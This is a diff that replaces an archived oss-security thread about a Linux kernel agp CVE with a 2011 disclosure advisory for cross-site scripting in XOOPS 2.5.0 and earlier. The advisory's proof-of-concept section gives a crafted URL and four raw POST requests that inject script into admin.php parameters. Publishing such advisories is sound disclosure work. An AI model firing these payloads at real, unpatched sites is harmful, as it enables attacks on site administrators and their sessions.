@@ -1,48 +1,153 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/04/22/11
-Message-ID: <4DB1A993.8070309@mvista.com>
-Date: Fri, 22 Apr 2011 06:15:15 -1000
-From: akuster <akuster@...sta.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/03/18/13
+Message-ID: <AANLkTi=0vH8dCVfx9T3OzBD29hiW+=Y2XJMD=_o_44+5@mail.gmail.com>
+Date: Fri, 18 Mar 2011 21:02:29 +0800
+From: YGN Ethical Hacker Group <lists@...g.net>
 To: oss-security@...ts.openwall.com
-CC: Vasiliy Kulikov <segoon@...nwall.com>,  Petr Matousek <pmatouse@...hat.com>
-Subject: Re: CVE request: kernel: buffer overflow and DoS issues in agp
+Subject: CVE Request: XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
 Content-Type: text/plain; charset=utf-8
 
+XOOPS 2.5.0 <= Cross Site Scripting Vulnerability
 
-I am a bit confused.
 
-https://bugzilla.redhat.com/show_bug.cgi?id=698999 references
-https://lkml.org/lkml/2011/4/14/294
 
- which is assigned to CVE-2011-1746 not CVE-2011-1747.
+1. OVERVIEW
 
-is there a patch for CVE-2011-1747?
+The XOOPS 2.5.0 and lower versions were vulnerable to Cross Site Scripting.
 
-- Armin
 
-On 04/22/2011 05:32 AM, Vasiliy Kulikov wrote:
-> On Fri, Apr 22, 2011 at 11:11 -0400, Petr Matousek wrote:
->>> Another problem in agp code is not addressed in the patch - kernel
->>> memory
->>> exhaustion (AGPIOC_RESERVE and AGPIOC_ALLOCATE ioctls). It is not
->>> checked
->>> whether requested pid is a pid of the caller (no check in
->>> agpioc_reserve_wrap()).
->>> Each allocation is limited to 16KB, though, there is no per-process
->>> limit.
->>> This might lead to OOM situation, which is not even solved in case of
->>> the
->>> caller death by OOM killer - the memory is allocated for another
->>> (faked)
->>> process."
->>
->> Please use CVE-2011-1747.
-> 
-> In https://bugzilla.redhat.com/show_bug.cgi?id=698999 it is said
-> "Reference and patch:", but there is no patch for the issue (as I said
-> in the patch description).  I have no agp hardware and I cannot test
-> whether forcing the requested pid to the current pid is a good idea (it
-> might not).
-> 
-> Thanks,
-> 
+2. BACKGROUND
+
+XOOPS is an acronym of eXtensible Object Oriented Portal System. It's
+the #1 Content Management System (CMS) project on www.sourceforge.net
+and a recipient of several awards, and constantly places as finalist
+in various CMS and Open Source competitions. It incorporates many
+modules such as forums, photo galleries, calendars, article management
+etc.
+
+
+3. VULNERABILITY DESCRIPTION
+
+Several parameters such as module/module[], memberslist_id[],
+newname[], oldname[] were not properly sanitized upon submission to
+the /modules/system/admin.php url, which allows attacker to conduct
+Cross Site Scripting attack. This may allow an attacker to create a
+specially crafted URL that would execute arbitrary script code in a
+victim's browser.
+
+
+4. VERSIONS AFFECTED
+
+XOOPS 2.5.0 and lower
+
+
+5. PROOF-OF-CONCEPT/EXPLOIT
+
+
+Parameter: module
+
+http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin&op=install&module=pm%3Cimg%20src=a%20onerror=alert%28String.fromCharCode%2888,83,83%29%29%3Eaawe
+
+
+Parameter: module[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1"><script>alert(1)</script>&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+Parameter: memberslist_id[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=users&selgroups=2
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 94
+
+memberslist_id%5b%5d="><script>alert(1)</script>&op=action_group&Submit=&selgroups=1&fct=mailusers&edit_group=add_group
+[/REQUEST]
+
+
+Parameter: newname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System&fct=modulesadmin&newname%5b1%5d=System"><script>alert(1)</script>
+[/REQUEST]
+
+
+Parameter: oldname[]
+
+[REQUEST]
+POST /xoops/modules/system/admin.php HTTP/1.1
+Host: attacker.in
+Connection: close
+Referer: http://attacker.in/xoops/modules/system/admin.php?fct=modulesadmin
+Cookie: PHPSESSID=b11e32946cf66e9a6391ccbad34453af;
+xoops_user=1-549115432fcb56150b18bef08004f77d;
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+op=confirm&module%5b%5d=1&submit=Submit&oldname%5b1%5d=System"><script>alert(1)</script>1bf8581e3dc&fct=modulesadmin&newname%5b1%5d=System
+[/REQUEST]
+
+
+6. SOLUTION
+
+Upgrade to XOOPS 2.5.1 or higher
+
+
+7. VENDOR
+
+XOOPS Development Team
+http://xoops.org
+
+
+8. CREDIT
+
+This vulnerability was discovered by Aung Khant, http://yehg.net, YGN
+Ethical Hacker Group, Myanmar.
+
+
+9. DISCLOSURE TIME-LINE
+
+2011-03-10: notified vendor
+2011-03-16: vendor released fixed version
+2011-03-18: vulnerability disclosed
+
+
+10. REFERENCES
+
+Original Advisory URL:
+http://yehg.net/lab/pr0js/advisories/[xoops_2.5.0]_cross_site_scripting
+Vendor Announcement: http://xoops.org/modules/news/article.php?storyid=5851
+What XSS Can Do: http://yehg.net/lab/pr0js/view.php/What%20XSS%20Can%20Do.pdf
+XSS FAQs: http://www.cgisecurity.com/articles/xss-faq.shtml
+XSS (wiki): http://en.wikipedia.org/wiki/Cross-site_scripting
+XSS (owasp): http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
+OWASP Top 10: http://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
+CWE-79: http://cwe.mitre.org/data/definitions/79.html
+
+
+#yehg [2011-03-18]
